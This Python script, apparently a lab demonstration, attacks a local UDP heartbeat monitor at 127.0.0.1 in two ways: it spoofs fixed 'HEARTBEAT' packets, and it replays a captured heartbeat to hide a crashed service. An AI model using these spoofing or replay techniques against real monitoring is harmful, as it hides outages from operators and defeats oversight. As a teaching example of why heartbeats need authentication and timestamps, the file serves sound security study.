import socket
import sys
import time

MONITOR_HOST = "127.0.0.1"
MONITOR_PORT = 9999


def attack_1_spoofing():
    """Attack 1: Continuously transmits fake heartbeat messages to fool the monitor."""
    print("[+] Starting Attack 1: Heartbeat Spoofing...")
    print("[*] Target Monitor: {}:{}".format(MONITOR_HOST, MONITOR_PORT))
    print("[*] Sending fake heartbeats. Check the monitor to see if it claims 'healthy' after a crash.")

    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as spoof_socket:
        try:
            while True:
                # Spoofing the exact static payload expected by the monitor
                spoof_socket.sendto(b"HEARTBEAT", (MONITOR_HOST, MONITOR_PORT))
                time.sleep(1.0)
        except KeyboardInterrupt:
            print("\n[-] Spoofing stopped.")


def attack_2_replay():
    """
    Attack 2: Simulates capturing a packet payload and replaying it.
    (Since the packet has no payload status/timestamp,
    the text itself is the captured payload).
    """
    print("[+] Starting Attack 2: Replay Attack...")
    
    #Listens for a packet to be sent by the firewall and gets captured
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sniffer:
        try:
            sniffer.bind((MONITOR_HOST, MONITOR_PORT))
            packet_data, sender_address = sniffer.recvfrom(1024)
            
            captured_payload = packet_data
            
        except Exception as e:
            print(f"[-] Sniffing error: {e}")
            return
    
    print("[*] Intercepted/Captured payload: {}".format(captured_payload))
    print("[*] Replaying the packet indefinitely to mask downtime...")

    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as replay_socket:
        try:
            while True:
                # Replaying the exact data over and over
                replay_socket.sendto(captured_payload, (MONITOR_HOST, MONITOR_PORT))
                time.sleep(1.0)
        except KeyboardInterrupt:
            print("\n[-] Replay stopped.")


if __name__ == "__main__":
    #Usage: python attacker.py [--spoof | --replay]
    if sys.argv[1] == "--spoof":
        attack_1_spoofing()
    elif sys.argv[1] == "--replay":
        attack_2_replay()